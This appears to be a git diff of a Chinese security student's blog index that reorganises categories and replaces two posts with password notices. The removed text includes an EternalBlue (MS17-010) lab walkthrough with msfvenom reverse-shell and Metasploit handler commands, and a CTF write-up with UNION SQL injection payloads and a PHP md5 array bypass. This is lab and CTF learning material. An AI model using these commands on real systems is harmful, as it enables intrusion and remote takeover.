@@ -147,7 +147,7 @@
   
     
       <article
-id="post-工具/docker"
+id="post-工具/docker常用命令"
 class="article article-type-post"
 >
 
@@ -158,7 +158,7 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/07/20/%E5%B7%A5%E5%85%B7/docker/">docker 常用命令</a>
+        <a href="/2020/07/20/%E5%B7%A5%E5%85%B7/docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/">docker常用命令</a>
     </header>
     <div class="article-entry post-inner-html">
         
@@ -285,7 +285,7 @@ docker-compose down
   
     
       <article
-id="post-漏洞/MS17-010漏洞复现"
+id="post-漏洞研究/MS17-010漏洞复现"
 class="article article-type-post"
 >
 
@@ -296,50 +296,11 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">MS17-010漏洞复现</a>
+        <a href="/2020/07/18/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">MS17-010漏洞复现</a>
     </header>
     <div class="article-entry post-inner-html">
         
-        <h2 id="复现环境"><a class="header-anchor" href="#复现环境"></a>复现环境</h2>
-<p>靶机：Windows server 2012 R2 standard	(192.168.233.129)</p>
-<p>攻击机：Kali Linux	(192.168.233.128)</p>
-<h2 id="步骤"><a class="header-anchor" href="#步骤"></a>步骤</h2>
-<h3 id="环境配置"><a class="header-anchor" href="#环境配置"></a>环境配置</h3>
-<p>关闭靶机防火墙</p>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201425575.png" alt="image-20200718201425575"></p>
-<p>在window server 2012中启动Guest账号</p>
-<p>开始菜单 -&gt; 管理工具 -&gt; 本地安全策略</p>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718201705610.png" alt="image-20200718201705610"></p>
-<h3 id="攻击"><a class="header-anchor" href="#攻击"></a>攻击</h3>
-<p>漏洞利用工具：<a href="https://github.com/vivami/MS17-010">https://github.com/vivami/MS17-010</a></p>
-<p>本次复现用到了 <code>eternalblue_kshellcode_x64.asm</code> 、<code>eternalblue_exploit8.py</code></p>
-<p>下载到kali后后使用NASM工具对asm代码编译</p>
-<pre><code>nasm -f bin eternalblue_kshellcode_x64.asm
-</code></pre>
-<p>然后利用<code>msfvenom</code>工具生成payload，用于反弹shell</p>
-<pre><code>msfvenom -p windows/x64/shell/reverse_tcp -f raw -o reverse_shell.bin EXITFUNC=thread LHOST=192.168.233.128 LPORT=9090
-</code></pre>
-<p>将 <code>kernel shellcode</code>和 <code>userland shellcode</code> 拼接为<code>metasploit_msf.bin</code></p>
-<pre><code>cat eternalblue_x64_kshellcode reverse_shell.bin &gt; metasploit_msf.bin
-</code></pre>
-<p>在新终端启动<code>metasploit</code> 并输入一下命令以监听反弹shell</p>
-<pre><code>use exploit/multi/handler
-set PAYLOAD windows/x64/shell/reverse_tcp
-set LHOST 192.168.233.128
-set LPORT 9090
-exploit
-</code></pre>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205527473.png" alt="image-20200718205527473"></p>
-<p>回到原终端，修改<code>eternalblue_exploit8.py</code></p>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718205908133.png" alt="image-20200718205908133"></p>
-<p>保存退出，然后运行该脚本</p>
-<pre><code>python eternalblue_exploit8.py 192.168.233.129 metasploit_msf.bin 500
-</code></pre>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210137709.png" alt="image-20200718210137709"></p>
-<p>运行成功，此时返回msf命令行</p>
-<p><img src="/2020/07/18/%E6%BC%8F%E6%B4%9E/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200718210508820.png" alt="image-20200718210508820"></p>
-<p>可以看到，已成功连接到靶机，并获得了system权限。</p>
-
+        The article has been encrypted, please enter your password to view.<br>
         
     </div>
     </div>
@@ -358,12 +319,12 @@ exploit
 </div>
     
         <div class="article-category">
-        <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
+        <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">漏洞研究</a>
         </div>
     
     
         <div class="article-tag">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag">漏洞</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
         </div>
     
     </div>
@@ -375,7 +336,7 @@ exploit
   
     
       <article
-id="post-编程语言/Java/GUI编程"
+id="post-计算机基础/编程语言/Java/Java-GUI编程"
 class="article article-type-post"
 >
 
@@ -386,11 +347,11 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/07/10/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/GUI%E7%BC%96%E7%A8%8B/">Java-GUI编程</a>
+        <a href="/2020/07/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-GUI%E7%BC%96%E7%A8%8B/">Java-GUI编程</a>
     </header>
     <div class="article-entry post-inner-html">
         
-        <h2 id="swing"><a class="header-anchor" href="#swing"></a>swing</h2>
+        <h1>swing</h1>
 <p><strong>JFrame</strong> – java的GUI程序的基本思路是以JFrame为基础，它是屏幕上window的对象，能够最大化、最小化、关闭。<br>
 <strong>JPanel</strong> – Java图形用户界面(GUI)工具包swing中的面板容器类，包含在javax.swing 包中，可以进行嵌套，功能是对窗体中具有相同逻辑功能的组件进行组合，是一种轻量级容器，可以加入到JFrame窗体中。</p>
 <p><strong>JLabel</strong> – JLabel 对象可以显示文本、图像或同时显示二者。可以通过设置垂直和水平对齐方式，指定标签显示区中标签内容在何处对齐。默认情况下，标签在其显示区内垂直居中对齐。默认情况下，只显示文本的标签是开始边对齐；而只显示图像的标签则水平居中对齐。</p>
@@ -416,7 +377,7 @@ class="article article-type-post"
 </div>
     
         <div class="article-category">
-        <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a>
+        <a class="article-category-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a>
         </div>
     
     
@@ -433,7 +394,7 @@ class="article article-type-post"
   
     
       <article
-id="post-编程语言/Java/网络编程"
+id="post-计算机基础/编程语言/Java/Java-网络编程"
 class="article article-type-post"
 >
 
@@ -444,11 +405,11 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java网络编程</a>
+        <a href="/2020/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/">Java-网络编程</a>
     </header>
     <div class="article-entry post-inner-html">
         
-        <h2 id="SOCKET"><a class="header-anchor" href="#SOCKET"></a>SOCKET</h2>
+        <h1>SOCKET</h1>
 <p><strong>定义：<code>socket</code>即套接字，由 ip 地址和端口号两个部分组成</strong></p>
 <pre><code class="language-java"> InetAddress类：
 
@@ -482,8 +443,8 @@ class="article article-type-post"
      
  public void close()
 </code></pre>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
-<p><img src="/2020/07/08/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
+<p><img src="/2020/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708193332767.png" alt="image-20200708193332767"></p>
+<p><img src="/2020/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200708213133726.png" alt="image-20200708213133726"></p>
 
         
     </div>
@@ -503,7 +464,7 @@ class="article article-type-post"
 </div>
     
         <div class="article-category">
-        <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a>
+        <a class="article-category-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a>
         </div>
     
     
@@ -520,7 +481,7 @@ class="article article-type-post"
   
     
       <article
-id="post-基础知识/Windows内存扫描器的设计和实现"
+id="post-计算机基础/Windows内存扫描器的设计和实现"
 class="article article-type-post"
 >
 
@@ -531,22 +492,22 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/">Windows内存扫描器的设计和实现</a>
+        <a href="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/">Windows内存扫描器的设计和实现</a>
     </header>
     <div class="article-entry post-inner-html">
         
-        <h1>1、程序目标</h1>
+        <h1>程序目标</h1>
 <ol>
 <li>利用Windows系统提供的接口读取内存数据；</li>
 <li>对获取的数据进行分析，包括内存结构、进程链表、页目录表结构和进程信息；</li>
 <li>实现物理内存内容的定位功能，能快速回到物理内存的起始地址或结束地址；</li>
 <li>实现物理内存数据修改功能，并展示内存数据修改后的结果；</li>
 </ol>
-<h1>2、总体设计</h1>
+<h1>总体设计</h1>
 <p>程序预期包含四个功能，每个功能由一个程序模块实现。如下图，程序运行时首先调用<code>getSystemInfo</code>函数获取系统及内存基本信息，再执行<code>getProcessInfo</code>函数获取当前正在运行的所有进程及其对应pid，用户输入进程pid选择要扫描的进程后，调用<code>getMemoryBlock</code>扫描该进程使用的内存，逐一打印内存块信息（起始地址、内存块大小、内存块状态、访问权限等），打印完成后用户选择查询内存内容或者修改内存内容，这两个功能分别由<code>SearchProcessMemory</code>和<code>ModifyProcessMemory</code>实现。</p>
-<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps1.jpg" alt="img"></p>
-<h1>3、详细设计与实现</h1>
-<h2 id="3-1-数据结构设计"><a class="header-anchor" href="#3-1-数据结构设计"></a>3.1 数据结构设计</h2>
+<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps1.jpg" alt="img"></p>
+<h1>详细设计与实现</h1>
+<h2 id="数据结构设计"><a class="header-anchor" href="#数据结构设计"></a>数据结构设计</h2>
 <p>SYSTEM_INFO（操作系统信息）</p>
 <pre><code class="language-c++">typedef struct _SYSTEM_INFO {
     __C89_NAMELESS union {
@@ -612,7 +573,7 @@ class="article article-type-post"
     DWORD Type;
 } MEMORY_BASIC_INFORMATION32;
 </code></pre>
-<h2 id="3-2-程序模块设计"><a class="header-anchor" href="#3-2-程序模块设计"></a>3.2 程序模块设计</h2>
+<h2 id="程序模块设计"><a class="header-anchor" href="#程序模块设计"></a>程序模块设计</h2>
 <h3 id="getSystemInfo"><a class="header-anchor" href="#getSystemInfo"></a>getSystemInfo</h3>
 <p><code>GetSystemInfo(LPSYSTEM_INFO lpSystemInfo)</code>、<code>GlobalMemoryStatus(LPMEMORYSTATUS lpBuffer)</code>两个Windows提供的API可以分别获取系统信息和系统内存信息，在该模块中只要调用两个API后再打印结构体信息即可。</p>
 <h3 id="getProcessInfo"><a class="header-anchor" href="#getProcessInfo"></a>getProcessInfo</h3>
@@ -623,20 +584,20 @@ class="article article-type-post"
 <p>循环遍历存有内存块信息的列表MemList，选择状态为<code>MEM_COMMIT</code>的内存块（这些内存块中的数据值是有效的），再通过<code>ReadProcessMemory()</code>访问该内存区域，遍历该区域，将值为我们查找的内容的内存地址加入列表AddrList。最后将AddList中的地址打印出来。</p>
 <h3 id="ModifyProcessMemory"><a class="header-anchor" href="#ModifyProcessMemory"></a>ModifyProcessMemory</h3>
 <p>首先通过<code>OpenProcess()</code>获取进程句柄，需要注意的是，在打开进程时要选择获取所有控制权限，否则可能因为权限过低而无法进行内存的修改。<code>VirtualProtectEx()</code>修改内存块的保护模式，然后通过<code>WriteProcessMemory()</code>写入内存块具体位置的值，最后再次调用<code>VirtualProtectEx()</code>还原内存块的保护模式。</p>
-<h1>4、程序运行效果</h1>
+<h1>程序运行效果</h1>
 <blockquote>
 <p>运行环境：Windows 7 x64</p>
 </blockquote>
 <p>程序运行界面如图</p>
-<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps2.jpg" alt="img"></p>
-<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps3.jpg" alt="img"></p>
+<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps2.jpg" alt="img"></p>
+<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps3.jpg" alt="img"></p>
 <p>我们选择要打开的进程，以helloworld测试程序test.exe（PID为1500）为例（系统进程所需权限较高，会打开失败）：</p>
-<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps4.jpg" alt="img"></p>
+<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps4.jpg" alt="img"></p>
 <p>可以看到，成功打开进程后，打印了进程使用的内存块信息，打印完成后选择要执行的功能。以下分别演示内存查询和内存修改。</p>
-<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps5.jpg" alt="img"></p>
+<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps5.jpg" alt="img"></p>
 <p>可以查到存储的值为123456的内存地址有四个。接下来将其中一个的值修改为234567.</p>
-<p><img src="/2020/06/19/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps6.jpg" alt="img"></p>
-<h1>5、源代码</h1>
+<p><img src="/2020/06/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/Windows%E5%86%85%E5%AD%98%E6%89%AB%E6%8F%8F%E5%99%A8%E7%9A%84%E8%AE%BE%E8%AE%A1%E5%92%8C%E5%AE%9E%E7%8E%B0/wps6.jpg" alt="img"></p>
+<h1>源代码</h1>
 <p>readMemory.cpp</p>
 <pre><code class="language-c++">#include &quot;stdafx.h&quot;
 #include &lt;iostream&gt;
@@ -942,7 +903,7 @@ bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,\
 </div>
     
         <div class="article-category">
-        <a class="article-category-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>
+        <a class="article-category-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a>
         </div>
     
     
@@ -959,7 +920,7 @@ bool ModifyProcessMemory(DWORD dwProcessId,DWORD dwTagAddr,\
   
     
       <article
-id="post-基础知识/指令集和操作系统位数"
+id="post-计算机基础/指令集和操作系统位数"
 class="article article-type-post"
 >
 
@@ -970,17 +931,17 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/06/10/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/">指令集和操作系统位数</a>
+        <a href="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E6%8C%87%E4%BB%A4%E9%9B%86%E5%92%8C%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%BD%8D%E6%95%B0/">指令集和操作系统位数</a>
     </header>
     <div class="article-entry post-inner-html">
         
-        <h2 id="指令集"><a class="header-anchor" href="#指令集"></a>指令集</h2>
+        <h1>指令集</h1>
 <p>为了提高编写和运行程序的效率，将一些较为常用的指令（如积分，微分，乘除法等）写成一套标准的程序，即指令集。</p>
-<h3 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h3>
+<h2 id="X86和ARM"><a class="header-anchor" href="#X86和ARM"></a>X86和ARM</h2>
 <p>完整的，复杂的指令集称作<code>CISC</code> (Complex Instruction Set Computing)，在复杂指令集中许多运算是不常用的，让CPU支持所有指令是对晶体管的严重浪费，所以亨尼西和帕特森等人提出了一种更加简单的指令集，叫做精简指令集<code>RISC</code> (Reduced Instruction Set Computing)</p>
 <p><code>X86</code>是英特尔推出的一种CPU架构，采用复杂指令集CISC</p>
 <p><code>ARM</code>是acorn公司设计的CPU架构，采用精简指令集RISC</p>
-<h2 id="操作系统位数"><a class="header-anchor" href="#操作系统位数"></a>操作系统位数</h2>
+<h1>操作系统位数</h1>
 <p>首先明确<code>CPU位数</code>的概念，CPU位数即CPU在一个时钟周期内能够处理的二进制串的位数，也是CPU寄存器的位数。目前64位的CPU是主流。</p>
 <p>而<strong>操作系统位数</strong>即操作系统所依赖的指令集位数，可以理解为：32位的操作系统假定CPU是32位的，64位操作系统则假定CPU是64位的。所以，64位CPU的主机可以安装64位和32位甚至更低位数的操作系统，而32位CPU的主机只能安装32位及以下的操作系统（即向下兼容）。</p>
 
@@ -1002,7 +963,7 @@ class="article article-type-post"
 </div>
     
         <div class="article-category">
-        <a class="article-category-link" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a>
+        <a class="article-category-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/">计算机基础</a>
         </div>
     
     
@@ -1019,7 +980,7 @@ class="article article-type-post"
   
     
       <article
-id="post-CTF/比赛/ACTF校赛Web"
+id="post-杂记/CTF题解/ACTF校赛WriteUp"
 class="article article-type-post"
 >
 
@@ -1030,87 +991,11 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/">ACTF校赛Web</a>
+        <a href="/2020/06/05/%E6%9D%82%E8%AE%B0/CTF%E9%A2%98%E8%A7%A3/ACTF%E6%A0%A1%E8%B5%9BWriteUp/">ACTF校赛WriteUp</a>
     </header>
     <div class="article-entry post-inner-html">
         
-        <h2 id="Misc"><a class="header-anchor" href="#Misc"></a>Misc</h2>
-<h3 id="题目：签到"><a class="header-anchor" href="#题目：签到"></a>题目：签到</h3>
-<p><strong>flag值：ACTF{WeLc0mm_tO_acTf}</strong></p>
-<p>关注公众号，回复“一句话”即可</p>
-<h2 id="Crypto"><a class="header-anchor" href="#Crypto"></a>Crypto</h2>
-<h3 id="题目：Column-Permutation-Cipher"><a class="header-anchor" href="#题目：Column-Permutation-Cipher"></a>题目：Column Permutation Cipher</h3>
-<p><strong>flag值：actf{welcome_to_the_world_of_cryptography}</strong></p>
-<p>列换位密码，用密码学实验的脚本跑一下</p>
-<pre><code class="language-python">secret=&quot;&quot;
-secret=input(&quot;ciphertext:&quot;)
-length=len(secret)
-print(length)
-answer=&quot;&quot;
-for n in range(2,26):
-    k=length
-    while k%n!=0:
-        k=k+1
-    m=k//n
-    answer=&quot;&quot;
-    for i in range(m):
-        for j in range(i,length,m):
-            answer+=secret[j]
-        if ' is ' in answer :
-            print(&quot;############&quot;)
-            print(answer)
-</code></pre>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200606101942263.png" alt="image-20200606101942263"></p>
-<h2 id="Web"><a class="header-anchor" href="#Web"></a>Web</h2>
-<h3 id="题目：sql注入入门题"><a class="header-anchor" href="#题目：sql注入入门题"></a>题目：sql注入入门题</h3>
-<p><strong>flag值：（没记。。）</strong></p>
-<p>一个数字型SQL回显注入</p>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222156910.png" alt="image-20200529222156910"></p>
-<p>首先猜出字段数为4</p>
-<p>联合查询得到数据库名</p>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529222846198.png" alt="image-20200529222846198"></p>
-<p>数据表名</p>
-<pre><code>union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema='easy_sql_injection'
-</code></pre>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223409586.png" alt="image-20200529223409586"></p>
-<p>列名</p>
-<pre><code>union select group_concat(column_name),2,3,4 from information_schema.columns where table_name='Notice'
-</code></pre>
-<p><img src="/2020/06/05/CTF/%E6%AF%94%E8%B5%9B/ACTF%E6%A0%A1%E8%B5%9BWeb/image-20200529223713519.png" alt="image-20200529223713519"></p>
-<p>读取数据</p>
-<pre><code>union select group_concat(flag),2,3,4 from Notice
-</code></pre>
-<p>得到flag</p>
-<h3 id="题目：PHP代码审计入门题"><a class="header-anchor" href="#题目：PHP代码审计入门题"></a>题目：PHP代码审计入门题</h3>
-<p><strong>flag值：（没记。。）</strong></p>
-<pre><code class="language-php">&lt;?php
-error_reporting(0);
-include_once &quot;flag.php&quot;;
-show_source(__FILE__);
-
-session_start();
-
-
-if(!isset($_POST['key'])) {
-    die(&quot;not allow!&quot;);
-}
-
-if($_POST['key'] != $_SESSION['key']) {
-    die(&quot;Wrong key!&quot;);
-}
-
-if(isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
-    if($_GET['username'] == $_GET['password']) {
-        die(&quot;Your password can not be your username!&quot;);
-    }
-    if(md5($_GET['username']) === md5($_GET['password'])) {
-        echo $flag;
-    }
-}
-</code></pre>
-<p>第一次登录时，SESSION为空，所以POST一个<code>key=</code>即可，然后是md5，</p>
-<p><code>username[]=1</code> <code>password[]=2</code>即可满足条件</p>
-
+        The article has been encrypted, please enter your password to view.<br>
         
     </div>
     </div>
@@ -1129,12 +1014,12 @@ if(isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
 </div>
     
         <div class="article-category">
-        <a class="article-category-link" href="/categories/CTF/">CTF</a>
+        <a class="article-category-link" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a>
         </div>
     
     
         <div class="article-tag">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WriteUp/" rel="tag">WriteUp</a></li></ul>
         </div>
     
     </div>
@@ -1146,7 +1031,7 @@ if(isset($_GET['username']) &amp;&amp; isset($_GET['password'])) {
   
     
       <article
-id="post-编程语言/Java/异常及处理"
+id="post-计算机基础/编程语言/Java/Java-异常及处理"
 class="article article-type-post"
 >
 
@@ -1157,18 +1042,18 @@ class="article article-type-post"
 
     <div class="article-body">
     <header class="article-title">
-        <a href="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/">Java 异常及处理</a>
+        <a href="/2020/05/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/">Java-异常及处理</a>
     </header>
     <div class="article-entry post-inner-html">
         
-        <h2 id="分类"><a class="header-anchor" href="#分类"></a>分类</h2>
-<p><img src="/2020/05/16/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
-<h2 id="异常的处理"><a class="header-anchor" href="#异常的处理"></a>异常的处理</h2>
-<h3 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h3>
+        <h1>分类</h1>
+<p><img src="/2020/05/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java-%E5%BC%82%E5%B8%B8%E5%8F%8A%E5%A4%84%E7%90%86/image-20200516112004702.png" alt="image-20200516112004702"></p>
+<h1>异常的处理</h1>
+<h2 id="向上抛出（throws-异常类型）"><a class="header-anchor" href="#向上抛出（throws-异常类型）"></a>向上抛出（throws+异常类型）</h2>
 <p>不处理异常，将异常抛出给调用者。</p>
 <p><code>throw</code>  、<code>throws</code></p>
 <p>（挖坑待填）</p>
-<h3 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h3>
+<h2 id="就地捕获（try-catch-finally）"><a class="header-anchor" href="#就地捕获（try-catch-finally）"></a>就地捕获（try-catch-finally）</h2>
 <p>当程序发生异常时，系统捕获异常，转而执行异常处理代码。</p>
 <ol>
 <li>可能出现异常的代码用<code>try</code>块括起来</li>
@@ -1210,7 +1095,7 @@ class="article article-type-post"
 </div>
     
         <div class="article-category">
-        <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a>
